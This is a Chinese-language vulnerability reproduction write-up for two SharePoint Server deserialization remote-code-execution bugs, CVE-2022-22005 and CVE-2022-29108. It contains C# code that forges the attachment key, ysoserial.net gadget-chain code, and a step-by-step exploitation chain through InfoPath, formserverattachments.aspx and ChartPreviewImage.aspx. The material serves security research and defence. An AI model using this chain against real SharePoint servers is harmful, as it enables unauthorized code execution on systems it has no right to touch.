---
title: 'CVE-2022-22005 CVE-2022-29108 漏洞复现'
date: 2023-04-05 12:20:00
category: CVE
tags: [SharePoint]
published: true
hideInList: false
feature: 
isTop: false
---

# CVE-2022-22005 CVE-2022-29108 漏洞复现

## 简介

`CVE-2022-22005`和`CVE-2022-29108`都是`BinaryFormatter.Deserialize()`时候没对需要反序列化的内容类型进行设置，从而导致反序列化漏洞

## 环境配置

环境配置踩了很多坑

### InfoPath

`InfoPath`与`SharePoint Server`相连时（使用`InfoPath Designer`，选择`SharePoint List`）
1. `SharePoint Server`需要是企业版，一开始并没找到在哪里升级企业版，就重装了一个（简直是折磨），后面发现在`管理中心-升级和迁移`地方可以直接升级
2. 输入`SharePoint site`的地址时，不能用`IP`地址，必须要用域名（这里也卡了好久）（我这里是在`http://sp2019/`的`/`下创建了一个网站集，所以才是下图样子）
![InfoPath Designer SharePoint site](/img/CVE-2022-22005/InfoPath-Designer-SP-site.png)
3. 这里登录时，只需要用用户名即可，不用加林的名字（例如我的是`vangelis`，不能用`vangelis@sp.com.cn`），也不用加域的名字（例如不用加`SP\`在前面）
4. 添加一个`SharePoint List`之后，需要`Publish`，在左上角，这个只是上传一个模板，并不是在这里进行`attach file`
![InfoPath Design SharePoint List Publish](/img/CVE-2022-22005/InfoPath-Design-SP-List-Publish.png)

### SharePoint Server 

最开始直接打开`SharePoint List`的`test`，进行新建时，显示如下页面

![Share Point State Service](/img/CVE-2022-22005/SP-State-Service.png)

就是这个服务没开启，我配置的时候，也没找到地方开，因此直接用管理中心的配置导向，`启用服务器场配置导向`，在默认配置的时候进行`State Service`的开启

注：我这里并未开启自助创建站点`Self-Service Site Creation`的特性，跟[cve-2022-29108](https://www.starlabs.sg/blog/2022/05-new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/)，不太一致

### Debug

调试环境，我最开始用的`Visual Studio 2022`进行调试，但是这个调试，并不能跟到`BinaryFormatter.Deserialize()`的内部实现，最后发现还是2020年就不再更新的`dnSpy`还是最好用的
使用，`attach`的进程是`w3wp.exe`（选择其中端口开在`80`的），我调试时的`w3wp.exe`的`Command Line`如下
```powershell 
c:\windows\system32\inetsrv\w3wp.exe -ap "SharePoint - 80" -v "v4.0" -l "webengine4.dll" -a \\.\pipe\iisipm564fe27d-58a0-4dbf-ba0b-dfa28df62bb2 -h "C:\inetpub\temp\apppools\SharePoint - 80\SharePoint - 80.config" -w "" -m 0  
```

在`attach`进程之后，要点`全部中断`之后对于加载的`模块`进行查看核心的`dll`，对其进行反编译，然后下断点

## 漏洞

2022年01月的`Microsoft.Office.Server.Chart.dll`中的`loadChartImage()`如下，其并未对于通过`sessionKey`获取的内存进行反序列化检测

![2022-01 loadChartImage](/img/CVE-2022-22005/2022-01-Chart-dll-loadChartImage.png)

而在2022年02月的`Microsoft.Office.Server.Chart.dll`中的`loadChartImage()`，进行了类型绑定

![2022-02 loadChartImage](/img/CVE-2022-22005/2022-02-Chart-dll-loadChartImage.png)

## exp思路

### sessionKey 来源

`sessionKey`是由`sk`这个参数输入而来

![sessionKey](/img/CVE-2022-22005/Chart-sessionKey.png)

`FetchBinaryDaTa`主要是解析`key`，然后从数据库中获取`statekey`对应的内容

```C
public static byte[] FetchBinaryData(string key)
{
    StateKey key2 = StateKey.ParseKey(key);
    return StateManager.Current.PeekState(key2);
}
```

其中`g`是数据库的`id`，而`g2`是数据库中需要取得内容的`key`

![ParseKey](/img/CVE-2022-22005/ParseKey.png)

顺着这个思路很容易想到，应该想办法把一个可以导致反序列化攻击的内容存储到数据库中

根据 [ZDI cve-2021-27076](https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint) 的重播攻击，可以知道通过`InfoPath`附件上传的方式，可以使得附件的内容存储到数据库中，从而最后传播到反序列漏洞的位置

在此顺便记录一下`cve-2022-29108`的传参，其`pk`和`ok`会拼接达到之前的`sessionKey`的效果，`ot`需要设置为`chart`，`csk`跟`sk`一致

![Chart-CustomSessionStateKey](/img/CVE-2022-22005/Chart-CustomSessionStateKey.png)

### InfoPath 附件上传

#### 总流程简介

其主要流程如下（借用了 [cve-2022-29108](https://www.starlabs.sg/blog/2022/05-new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/) 的图）

![InfoPath-UploadFile](/img/CVE-2022-22005/InfoPath-UploadFile.png)

最终得到的`attachment id`才是我们需要的`key`

#### 细节

##### newifs.aspx

首先在`SharePoint Server`通过`InfoPath`创建一个`SharePoint List`，然后在`SharePoint List`中`新建`，上传一个附件，并驻留在此处

![attachFile](/img/CVE-2022-22005/1-1-attachFile.png)

在`Burpsuite`后台抓包时，可以看到一个对于`newifs.apx`的`POST`请求的包（当然，在这个`POST`请求之前也有个`GET`请求的包，在尝试写脚本的自动化利用时，发现`POST`请求的大部分的内容均来源自这个`GET`请求的`RESPONSE`），这个`POST`包中存在两个重要的值，一个是`_InfoPath_CanaryValue`（在`POST`包中），一个是`DBguid1_guid2`（称其为`itemId`）（在`RESPONSE`包中，通过上传的文件名可以搜到）

![newifs](/img/CVE-2022-22005/1-2-newifs-getItemId.png)

这个动作对应的是`Microsoft.Office.InfoPath.Server.dll`

```
namespace Microsoft.Office.InfoPath.Server.DocumentLifetime
class Document
internal static Document LoadFromSession(HttpContext context, SPSite contextSite, EventLogStart eventLogStart, Solution solution)
```

在调试`LoadFromSession`时，可以看到其`document`对象的`EditingSessionId`就是请求的返回中的`itemId`

---

注

这个时候，我产生了一个文件这个`itemId`不能直接用在`key`的那个反序列化漏洞上吗？我将这个传入`sk`，发现其取出来的内存如下，这个`itemId`只是那个上传文件对应动作的一些记录，并不是对应那个文件的内容，并且可以注意到这个`itemId`存储的东西里面最后`0x20c7a602c3c`的位置存在一个`stateKey`，这个就是上传文件的`StateKey`

![itemId-MemoryBuffer](/img/CVE-2022-22005/itemId-MemoryBuffer.png)

同样也可以在`Microsoft.Office.Server.dll`中下断点

```
namespace Microsoft.Office.Server.Administration
internal sealed class StateKey
public static StateKey GenerateKey()
```

可以看到首先在`SharePoint List`生成的页面`test`中点新建时，会创建一个`Document`对象，并生成其对应的`StateKey`，这个`StateKey`其实就是`itemId`，其调用路径是从`Microsoft.office.InfoPath.Server.DocumentLifetime.Document.GetNewEditingSessionId()`而来

![Document-GenerateKey](/img/CVE-2022-22005/Document-GenerateKey.png)

在`attachFile`之后，同样会断到`GenerateKey()`，其调用路径是从`Microsoft.Office.InfoPath.Server.DocumentLifetime.EventShartePointFileAttachmentAdd()`而来，最终会存到`doc.ChildStateKeys`中，我们后续也是为了把这个`ChildStateKeys`中的文件的`StateKey`给获取出来

![Document-ChildStateKeys](/img/CVE-2022-22005/Document-ChildStateKeys.png)

---

##### formserverattachments.aspx

然后，他们找到了一个文件下载的接口，在这个接口中传入这个`itemId`的值，可以最终得到此`Document`里面所有内容，同样可以得到这个里面的`ChildStateKeys`里面的值，感觉按照正常功能而言，应该传入一个上传的文件的`StateKey`，得到这个文件的内容，这里用了重播的攻击方式`a replay-style attack`

这个对应的接口是`FormServerAttachments.aspx`，对应是`Microsoft.Office.InfoPath.Server.dll`

```
namespace Microsoft.Office.InfoPath.Server.Controls
class FormServerAttachments
protected internal override void ProcessRequestInternal(HttpContext context)
```

（P.S 这里的`public class FormServerAttachments : ProcessRequestPageBase, IHttpHandler, IRequiresCultureInfo`，子类继承`IHttpHandler`和`ProcessRequestInternal`方法的继承均是很标准的`ASP.NET`处理`GET/POST`请求的写法）

在`FileDownload`接口中，可以看到主要有以下几个关心的参数`fid`、`sid`、`key`、`dl`

![FormServerAttachments FileDownload](/img/CVE-2022-22005/FormServerAttachments-FileDownload.png)

+ 对于`fid`基本没要求，只要求非空，将其设置为`1`即可

+ 对于`sid`，在`VerifyCanaryFromCookie`中可以看到是查询`_InfoPath_CanaryValue`是否正确，在对`newifs.aspx`进行`POST`的时候可以看到`_InfoPath_CanaryValue`后跟的值

![Canary VerifyCanaryFromCookie](/img/CVE-2022-22005/Canary-VerifyCanaryFromCookie.png)

+ 对于`key`要求比较多
  + 首先在32行，通过`DeserializeObjectsFromString`进行`base64`解码
  + 再在34行，通过`Base64DataItem`进行，获取`_state`（类型为`Base64ItemState`）、`_sessionDataType`（类型为`DataTypeInSessionState`）、`_itemId`（类型为`Base64SerializationId`）
  + 然后在36行，通过`DocumentChildState.StateInfo.Deserialize`获取`_serializeKey`（类型为`String`）、`_size`（类型为`int`）、`_version`（类型为`int`）
    + 在`EnsureData`中，可知`_state`应为`Base64ItemState.DelayLoad`（枚举类型，值为4）
    + 在`SetSessionData`中，可知`_sessionDataType`应为`Base64DataStorage.Base64DataItem.DataTypeInSessionState.ByteArray`（枚举类型，值为2）
    + `_serializeKey`应该为`Document`的`editingSessionId`
    + 其余并无要求

![Base64DataItem](/img/CVE-2022-22005/Base64DataItem.png) 
![DocumentChildState-Deserialize](/img/CVE-2022-22005/DocumentChildState-Deserialize.png)
![EnsureData-SetSessionData](/img/CVE-2022-22005/EnsureData-SetSessionData.png)

+ 对于`dl`，在第11行和第51行，要求其值应该为`ip`才能走到`FileAttachment.ReadInfoFromStream`，这样才能把取出来的`dataAsBytes`作为文件附件下载下来

```java
using System.IO;
using System.Text;
using System.Runtime.Serialization.Formatters.Binary;
using ConsoleApp1;

internal enum Base64ItemState
{
    NoChange,
    Updated,
    Removed,
    New,
    DelayLoad
}

internal enum DataTypeInSessionState
{
    Unknown,
    Utf8String,
    ByteArray
}

class Program
{
    public static string Base64Encode(string plainText)
    {
        var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
        return System.Convert.ToBase64String(plainTextBytes);
    }

    static void Main()
    {
        // 4
        Base64ItemState _state = Base64ItemState.DelayLoad;
        // 2
        DataTypeInSessionState _sessionDataType = DataTypeInSessionState.ByteArray;
        // _itermId : writer.Write(this.+_id.ToString)
        String _itemId = "ce21726d-43ff-41a3-9204-981a19e75827";
        String _serializedKey = "47b652a1843a427d9528e8ebe3f858d3_129790e9056046b2b93cf003c1788d6a";
        int _size = 1024;
        int _version = 69;
        
        MemoryStream memStream = new MemoryStream();
        // using (BinaryWriter writer = new BinaryWriter(File.Open("createKey.txt", FileMode.Create)))
        using (BinaryWriter writer = new BinaryWriter(memStream))
        {
            writer.Write7BitEncodedInt((byte)_state);
            writer.Write7BitEncodedInt((byte)_sessionDataType);
            writer.Write(_itemId);
            writer.Write(_serializedKey);
            writer.Write7BitEncodedInt(_size);
            writer.Write7BitEncodedInt(_version);
        }

        Console.WriteLine(Convert.ToBase64String(memStream.ToArray()));
        Console.WriteLine("Success");
    }
}
```

## BinaryFormatter 反序列化的利用

一开始用的[ysoserial.net](https://github.com/pwntester/ysoserial.net)中`BinaryFormatter`的`DataSet`POP链，但是一直不能弹计算器，不知道为什么，重搭了挺多次环境，以及尝试安装补丁的，最后还是深入了解了`DataSet`POP链以及定位到出错原因，查询资料，最后才在[mr_me 的 CVE-2020-1147](https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html)找到了答案

在此同时记录一下`DataSet`的POP链的构造

### DataSet 的POP链

借用[先知一篇DataSet的分析](https://xz.aliyun.com/t/9593#toc-1)

```java
[Serializable]
public class DataSetMarshal : ISerializable
{
    byte[] _fakeTable;

    public void GetObjectData(SerializationInfo info, StreamingContext context)
    {
        info.SetType(typeof(System.Data.DataSet));
        info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
        info.AddValue("DataSet.DataSetName", "");
        info.AddValue("DataSet.Namespace", "");
        info.AddValue("DataSet.Prefix", "");
        info.AddValue("DataSet.CaseSensitive", false);
        info.AddValue("DataSet.LocaleLCID", 0x409);
        info.AddValue("DataSet.EnforceConstraints", false);
        info.AddValue("DataSet.ExtendedProperties", (System.Data.PropertyCollection)null);
        info.AddValue("DataSet.Tables.Count", 1);
        info.AddValue("DataSet.Tables_0", _fakeTable);
    }

    public void SetFakeTable(byte[] bfPayload)
    {
        _fakeTable = bfPayload;
    }

    public DataSetMarshal(byte[] bfPayload)
    {
        SetFakeTable(bfPayload);
    }

    public DataSetMarshal(object fakeTable):this(fakeTable, new InputArgs())
    {
        // This won't use anything we might have defined in ysoserial.net BinaryFormatter process (such as minification)
    }

    public DataSetMarshal(object fakeTable, InputArgs inputArgs)
    {
        MemoryStream stm = new MemoryStream();
        if (inputArgs.Minify)
        {
            ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter fmtLocal = new ysoserial.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter();
            fmtLocal.Serialize(stm, fakeTable);
        }
        else
        {
            BinaryFormatter fmt = new BinaryFormatter();
            fmt.Serialize(stm, fakeTable);
        }

        SetFakeTable(stm.ToArray());
    }

    public DataSetMarshal(MemoryStream ms)
    {
        SetFakeTable(ms.ToArray());
    }
}

public class DataSetGenerator:GenericGenerator
{
    public override object Generate(string formatter, InputArgs inputArgs)
    {

        byte[] init_payload = (byte[]) new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);

        DataSetMarshal payloadDataSetMarshal = new DataSetMarshal(init_payload);

        if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
            || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
            || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
        { 
            return Serialize(payloadDataSetMarshal, formatter, inputArgs);
        }
        else
        {
            throw new Exception("Formatter not supported");
        }
    }
}
```

```java
[Serializable]
public class TextFormattingRunPropertiesMarshal : ISerializable
{
    protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
    {

    }

    string _xaml;
    public void GetObjectData(SerializationInfo info, StreamingContext context)
    {
        Type typeTFRP = typeof(TextFormattingRunProperties);
        info.SetType(typeTFRP);
        info.AddValue("ForegroundBrush", _xaml);            
    }
    public TextFormattingRunPropertiesMarshal(string xaml)
    {
        _xaml = xaml;
    }
}
```

我个人调试的时候的理解是，对于`DataSet`中一些属性进行设置了值，比如`DataSet.RemotingFormat`必须要设置为`System.Data.SerializationFormat.Binary`，`DataSet.Tables.Count`设置为`1`，`DataSet.Tables_0`设置为`_fakeTable`，其他值的设置是为了能顺利走到`remotingFormat`的`Deserialize()`位置

![remotingFormat](/img/CVE-2022-22005/remotingFormat.png)

最后在反序列的时候，中间嵌套一个`xml`，然后在`Parse`和`Load`的过程中直接触发`RCE`

![TextFormattingRunProperties](/img/CVE-2022-22005/TextFormattingRunProperties.png)

![XamlReader-Load](/img/CVE-2022-22005/XamlReader-Load.png)

但是在调试的时候，会发现，怎么样都不能过去`EventTrace.EasyTraceEvent`这句

![EventTrace](/img/CVE-2022-22005/EventTrace.png)

然后可以发现其异常的原因如下，其对应的英文为`The type initializer for 'MS.Utility.EventTrace' threw an exception.`

![](/img/CVE-2022-22005/MS-Utility-EventTrace.png)

最后在犄角旮旯的上述列举的博客中找到，这个进程不能访问某注册表，因为这个`IIS`服务器是模拟着`IUSR`账户的权限的

```
You cannot use the XamlReader.Load static method because the IIS webserver is impersonating as the IUSR account and that account has limited access to the registry.
```

所以不能使用任何包含`XamlReader.Load`POP链的`Gadget`，因此我选择使用`TypeConfuseDelegate`最后可以成功弹出计算器

注：这里不确定会不会存在`cmd`生成和`powershell`生成不一致以及`.NET Framework`版本跟打的版本不一致的问题，我最后是用`cmd`生成的

## 综上

整体的漏洞利用流程

1. 利用`InfoPath`给`SharePoint Server`企业版创建一个`SharePoint List`
2. 在`SharePoint List`中新建，并上传可以导致反序列利用的文件，并驻留在该页面，以会话的形式保存数据库中
3. 利用`newifs.aspx`请求得到的`_InfoPath_CanaryValue`和`Document`的`editingSessionId`给`formserverattachments.aspx`发送请求，假装下载文件，实则获取会话中的可以导致反序列利用的文件对应的`StateKey`
4. 将该`StateKey`传入可以被攻击的`aspx`中，CVE-2022-22005是用的`ChartPreviewImage.aspx`，其参数为`sk`；CVE-2022-29108也用的是`ChartPreviewImage.aspx`，其参数为`pk`，`ot`，`ok`，`csk`（`pk`为其`DBguid_`，`ot`为`chart`，`ok`为`Fileguid`，`csk`与`sk`一致）

## 参考

> https://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint
> https://hnd3884.github.io/posts/cve-2022-22005-microsoft-sharepoint-RCE
> https://www.starlabs.sg/blog/2022/05-new-wine-in-old-bottle-microsoft-sharepoint-post-auth-deserialization-rce-cve-2022-29108/
> https://xz.aliyun.com/t/9593
> https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html
> https://mp.weixin.qq.com/s/2IbSrLcjiqo1a6RF9-v3Yg